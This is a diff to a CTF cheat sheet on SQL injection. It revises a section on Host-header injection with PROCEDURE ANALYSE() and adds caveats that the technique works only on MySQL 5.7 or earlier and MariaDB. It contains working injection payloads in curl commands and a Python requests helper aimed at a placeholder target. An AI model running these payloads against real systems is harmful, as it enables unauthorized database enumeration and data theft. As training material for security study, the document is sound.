@@ -19,7 +19,7 @@ Comprehensive SQL injection techniques for CTF challenges. For other server-side
 - [PHP PCRE Backtrack Limit WAF Bypass (SECUINSIDE 2017)](#php-pcre-backtrack-limit-waf-bypass-secuinside-2017)
 - [information_schema.processlist Race Condition Leak (SECUINSIDE 2017)](#information_schemaprocesslist-race-condition-leak-secuinside-2017)
 - [SQL BETWEEN Operator Tautology Bypass (DefCamp 2017)](#sql-between-operator-tautology-bypass-defcamp-2017)
-- [Host Header SQL Injection with PROCEDURE ANALYSE() (DefCamp 2017)](#host-header-sql-injection-with-procedure-analyse-defcamp-2017)
+- [Host Header SQL Injection with PROCEDURE ANALYSE() (DefCamp 2017, MySQL ≤5.7 / MariaDB only)](#host-header-sql-injection-with-procedure-analyse-defcamp-2017-mysql-57-mariadb-only)
 - [SQLite Blind SQLi via randomblob() Timing (SECCON 2017)](#sqlite-blind-sqli-via-randomblob-timing-seccon-2017)
 - [vsprintf Double-Prepare Format String SQLi (AceBear 2018)](#vsprintf-double-prepare-format-string-sqli-acebear-2018)
 - [SQL INSERT ON DUPLICATE KEY UPDATE Password Overwrite (Midnight Sun CTF 2018)](#sql-insert-on-duplicate-key-update-password-overwrite-midnight-sun-ctf-2018)
@@ -350,7 +350,7 @@ def sqli_between(position, low_char, high_char):
 
 **Combining with schema enumeration when `information_schema` is blocked:**
 ```sql
--- PROCEDURE ANALYSE() as alternative (see next technique)
+-- PROCEDURE ANALYSE() as alternative on MySQL ≤5.7 / MariaDB (see next technique)
 SELECT * FROM users WHERE id BETWEEN id AND id PROCEDURE ANALYSE()
 ```
 
@@ -358,9 +358,9 @@ SELECT * FROM users WHERE id BETWEEN id AND id PROCEDURE ANALYSE()
 
 ---
 
-## Host Header SQL Injection with PROCEDURE ANALYSE() (DefCamp 2017)
+## Host Header SQL Injection with PROCEDURE ANALYSE() (DefCamp 2017, MySQL ≤5.7 / MariaDB only)
 
-**Pattern:** The HTTP `Host` header is used in a SQL query (e.g., to log access or resolve virtual hosts) without sanitization. Since Host is rarely tested by WAFs, standard injection techniques work. When `information_schema` is blocked, MySQL's `PROCEDURE ANALYSE()` provides table and column enumeration.
+**Pattern:** The HTTP `Host` header is used in a SQL query (e.g., to log access or resolve virtual hosts) without sanitization. Since Host is rarely tested by WAFs, standard injection techniques work. When `information_schema` is blocked, MySQL's `PROCEDURE ANALYSE()` provides table and column enumeration (MySQL ≤5.7 / MariaDB only — removed in MySQL 8.0.1).
 
 ```bash
 # Test: inject into Host header
@@ -370,9 +370,9 @@ curl -H "Host: ' OR '1'='1'--" http://target/
 # UNION injection via Host header:
 curl -H "Host: ' UNION SELECT table_name,2,3 FROM information_schema.tables-- " http://target/
 
-# When information_schema is blocked, use PROCEDURE ANALYSE():
-curl -H "Host: ' UNION SELECT * FROM users PROCEDURE ANALYSE()-- " http://target/
-# PROCEDURE ANALYSE() returns column types and suggested data types, leaking column names
+# When information_schema is blocked, append PROCEDURE ANALYSE() to the running query:
+curl -H "Host: ' PROCEDURE ANALYSE()-- " http://target/
+# PROCEDURE ANALYSE() analyses the result set and returns column metadata, leaking column names
 ```
 
 ```python
@@ -384,9 +384,9 @@ def host_sqli(payload):
     r = requests.get(TARGET, headers={"Host": payload})
     return r.text
 
-# Enumerate tables via PROCEDURE ANALYSE() when information_schema blocked:
-# First: get column names from a known/guessed table
-result = host_sqli("' UNION SELECT username,password FROM users PROCEDURE ANALYSE()-- ")
+# Enumerate columns via PROCEDURE ANALYSE() when information_schema blocked:
+# No UNION column-count matching needed — it analyses the app query's own result set
+result = host_sqli("' PROCEDURE ANALYSE()-- ")
 print(result)
 
 # PROCEDURE ANALYSE() output includes: field names, min/max values, optimal data type
@@ -410,7 +410,7 @@ User-Agent           # logged for analytics
 Referer              # logged for referral tracking
 ```
 
-**Key insight:** `PROCEDURE ANALYSE()` is a MySQL-specific alternative to `information_schema` for schema enumeration — it analyzes the result set and returns column metadata. Host header injection is often overlooked by WAFs and developers because it's not a typical user input field, yet it frequently flows into SQL queries for logging, virtual hosting, or analytics.
+**Key insight:** `PROCEDURE ANALYSE()` is a legacy (MySQL ≤5.7 / MariaDB only, removed in MySQL 8.0.1) alternative to `information_schema` for schema enumeration — it analyzes the result set and returns column metadata. On MySQL 8+, use `mysql.innodb_table_stats` instead (see "MySQL innodb_table_stats as information_schema Alternative" below). Host header injection is often overlooked by WAFs and developers because it's not a typical user input field, yet it frequently flows into SQL queries for logging, virtual hosting, or analytics.
 
 ---
 
